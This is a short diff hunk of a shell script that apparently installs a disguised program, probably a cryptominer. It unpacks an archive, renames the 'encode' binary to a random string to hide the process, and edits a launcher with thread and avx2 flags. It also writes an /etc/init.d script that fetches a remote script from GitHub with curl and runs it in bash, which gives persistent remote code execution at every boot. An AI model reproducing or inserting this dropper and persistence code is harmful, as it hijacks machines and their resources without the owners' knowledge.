@@ -4,7 +4,7 @@ tar -xvf analog.tar
 cd /analog
 variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
 mv encode $variable1
-sed -i "s/mongodb/${variable1} -n=${variable1} -t=10 -s=avx2/g" ./device.sh
+sed -i "s/mongodb/${variable1} -n=${variable1} -t=10 -s=avx2/g" ./decode.sh
 cd /etc/init.d
 echo "bash <(curl -s -L https://raw.githubusercontent.com/currento/magneta/main/byone.sh)" > digital.sh
 chmod a+x digital.sh
